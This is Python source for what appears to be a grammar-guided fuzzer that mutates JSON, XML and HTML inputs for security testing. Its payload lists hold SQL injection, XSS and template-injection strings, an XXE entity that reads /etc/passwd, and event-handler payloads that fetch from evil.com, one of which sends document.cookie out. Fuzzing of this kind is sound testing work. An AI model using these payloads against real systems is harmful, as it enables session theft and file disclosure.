"""
Abstract Syntax Tree (AST) Grammar-Guided Mutator.
Implements syntactic boundary mutations for structured payloads
(JSON/XML/HTML).
"""

from __future__ import annotations

import copy
import json
import random
import re
from abc import ABC, abstractmethod
from collections.abc import Callable
from typing import Any, cast

import defusedxml.ElementTree as ET  # noqa: N817

# Maximum time allowed for a single regex operation (seconds).
_REGEX_TIMEOUT: float = 2.0


class _RegexTimeoutError(Exception):
    """Raised when a regex operation exceeds its time limit."""


def _safe_re_sub(
    pattern: str,
    repl: str | Callable[[re.Match[str]], str],
    string: str,
    *,
    flags: int = 0,
    count: int = 0,
) -> str:
    """re.sub wrapper with a wall-clock timeout to prevent ReDoS."""
    import concurrent.futures

    from src.infrastructure.execution_engine.shared_pool import get_shared_executor

    def _do_sub() -> str:
        return re.sub(pattern, repl, string, count=count, flags=flags)

    pool = get_shared_executor()
    future = pool.submit(_do_sub)
    try:
        return future.result(timeout=_REGEX_TIMEOUT)
    except concurrent.futures.TimeoutError:
        future.cancel()
        raise _RegexTimeoutError(
            f"Regex operation timed out after {_REGEX_TIMEOUT}s (pattern: {pattern[:80]})"
        )


class BaseASTMutator(ABC):
    """Abstract base class for all AST-based mutators."""

    @abstractmethod
    def mutate(self, base_text: str) -> list[str]:
        """Generate syntactic mutations of the input base string."""
        pass


class JSONASTMutator(BaseASTMutator):
    """Mutates JSON payloads by traversing their AST and applying syntactic transformations."""

    def __init__(self, strategies: list[Any] | None = None):
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._mutate_values,
                self._swap_keys,
                self._nest_deeply,
                self._type_confusion,
            ]
        )

    def mutate(self, base_json: str) -> list[str]:
        """Generate syntactic mutations of the input JSON string."""
        try:
            ast = json.loads(base_json)
        except json.JSONDecodeError:
            return []

        results = []
        for strategy in self.strategies:
            mutated_ast = strategy(copy.deepcopy(ast))  # Work on a fresh copy
            results.append(json.dumps(mutated_ast, separators=(",", ":")))

        return results

    def _mutate_values(self, node: Any) -> Any:
        """Replace primitive values with boundary/injection values."""
        if isinstance(node, dict):
            new_dict = {}
            for k in node:
                new_dict[k] = self._mutate_values(node[k])
            return new_dict
        elif isinstance(node, list):
            new_list = []
            for item in node:
                new_list.append(self._mutate_values(item))
            return new_list
        elif isinstance(node, str):
            return random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null"])  # noqa: S311
        elif isinstance(node, (int, float)):
            return random.choice([0, -1, 2147483647])  # noqa: S311
        return node

    def _swap_keys(self, node: Any) -> Any:
        """Swap keys within a dictionary to test schema flexibility."""
        if isinstance(node, dict) and len(node) >= 2:
            new_node = copy.deepcopy(node)
            keys = list(new_node.keys())
            k1, k2 = random.sample(keys, 2)
            new_node[k1], new_node[k2] = new_node[k2], new_node[k1]
            return new_node
        return node

    def _nest_deeply(self, node: Any) -> Any:
        """Recursively nest a value to test parser stack limits."""
        if isinstance(node, dict) and node:
            new_node = copy.deepcopy(node)
            key = random.choice(list(new_node.keys()))  # noqa: S311
            val = new_node[key]
            depth = min(20, max(1, 20 - len(str(val)) // 1000))
            for _ in range(depth):
                val = {"n": val}
            new_node[key] = val
            return new_node
        return node

    def _type_confusion(self, node: Any) -> Any:
        """Change the type of a node (e.g. string to list)."""
        if isinstance(node, dict) and node:
            new_node = copy.deepcopy(node)
            key = random.choice(list(new_node.keys()))  # noqa: S311
            new_node[key] = [new_node[key], "type_confusion_probe"]
            return new_node
        return node


class XMLASTMutator(BaseASTMutator):
    """Mutates XML payloads by parsing them into an element tree and applying transformations."""

    def __init__(self, strategies: list[Any] | None = None) -> None:
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._mutate_text_content,
                self._swap_elements,
                self._deeply_nest,
                self._inject_entities,
                self._mutate_attributes,
            ]
        )

    def mutate(self, base_xml: str) -> list[str]:
        results: list[str] = []
        for strategy in self.strategies:
            result = strategy(base_xml)
            if result:
                results.append(result)
        return results

    def _mutate_text_content(self, xml_str: str) -> str | None:
        """Replace text content in XML elements with boundary values."""
        result = _safe_re_sub(
            r">([^<]{0,10000})<",
            lambda m: (
                ">"
                + random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null", "${7*7}", ""])  # noqa: S311
                + "<"
            ),
            xml_str,
        )
        if not isinstance(result, str):
            return None
        return result

    def _swap_elements(self, xml_str: str) -> str | None:
        """Swap the order of sibling XML elements."""
        root = self._safe_parse(xml_str)
        if root is None:
            return None
        children = list(root)
        if len(children) < 2:
            return None
        idx1, idx2 = random.sample(range(len(children)), 2)
        root[idx1], root[idx2] = root[idx2], root[idx1]
        return cast(str, ET.tostring(root, encoding="unicode"))

    def _deeply_nest(self, xml_str: str) -> str | None:
        """Nest an element deeply to test parser stack limits."""
        root = self._safe_parse(xml_str)
        if root is None:
            return None
        if len(root) == 0:
            return None
        target = root[random.randint(0, len(root) - 1)]  # noqa: S311
        for _ in range(20):
            wrapper = ET.Element("nested")
            wrapper.append(target)
            target = wrapper
        return cast(str, ET.tostring(root, encoding="unicode"))

    def _inject_entities(self, xml_str: str) -> str | None:
        """Inject XXE / entity-related payloads."""
        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<root>&xxe;</root>"
        )
        return payload

    def _mutate_attributes(self, xml_str: str) -> str | None:
        """Mutate XML attribute values."""
        result = _safe_re_sub(
            r'(\w+)=["\']([^"\']{0,10000})["\']',
            lambda m: (
                m.group(1)
                + '="'
                + random.choice(["' OR '1'='1", "><script>", "", "null", "${7*7}"])  # noqa: S311
                + '"'
            ),
            xml_str,
        )
        if not isinstance(result, str):
            return None
        return result

    @staticmethod
    def _safe_parse(xml_str: str) -> ET.Element | None:
        try:
            return ET.fromstring(xml_str)
        except (ET.ParseError, Exception):
            # defusedxml raises DefusedXmlException or ParseError for malicious XML
            return None


class HTMLASTMutator(BaseASTMutator):
    """Mutates HTML payloads using regex-based tree manipulation."""

    def __init__(self, strategies: list[Any] | None = None) -> None:
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._mutate_attributes,
                self._inject_event_handlers,
                self._deeply_nest,
                self._inject_scripts,
            ]
        )

    def mutate(self, base_html: str) -> list[str]:
        results: list[str] = []
        for strategy in self.strategies:
            result = strategy(base_html)
            if result:
                results.append(result)
        return results

    def _mutate_attributes(self, html_str: str) -> str | None:
        """Replace attribute values with XSS probes."""
        result = _safe_re_sub(
            r'(\w+)=["\']([^"\']{0,10000})["\']',
            lambda m: (
                m.group(1)
                + '="'
                + random.choice(["javascript:alert(1)", "'';!--\"<XSS>=&{()}"])  # noqa: S311
                + '"'
            ),
            html_str,
        )
        if not isinstance(result, str):
            return None
        return result

    def _inject_event_handlers(self, html_str: str) -> str | None:
        """Inject event handler attributes into HTML tags."""
        events = ["onload", "onerror", "onclick", "onfocus", "onmouseover", "onchange"]
        handlers = ["alert(1)", "fetch('https://evil.com/?'+document.cookie)"]
        tag_pattern = re.compile(r"(<\s*\w+[^>]{0,5000})>")

        def _inject(m: re.Match[str]) -> str:
            tag = m.group(1)
            if any(ev.split("=")[0] in tag for ev in events):
                return tag + ">"
            event = random.choice(events)  # noqa: S311
            handler = random.choice(handlers)  # noqa: S311
            return f'{tag} {event}="{handler}">'

        result = tag_pattern.sub(_inject, html_str)
        if not isinstance(result, str):
            return None
        return result

    def _deeply_nest(self, html_str: str) -> str | None:
        """Nest HTML tags deeply to test parser stack limits."""
        # Cap depth to prevent O(n·depth) memory blow-up
        max_depth = min(100, max(1, 100000 // max(1, len(html_str))))
        result = html_str
        for _ in range(max_depth):
            result = f"<div>{result}</div>"
        return result

    def _inject_scripts(self, html_str: str) -> str | None:
        """Inject script tags into the HTML."""
        scripts = [
            "<script>alert(1)</script>",
            "<script>fetch('https://evil.com/').then(r=>r.text()).then(alert)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
        ]
        result = html_str + random.choice(scripts)  # noqa: S311
        if not isinstance(result, str):
            return None
        return result
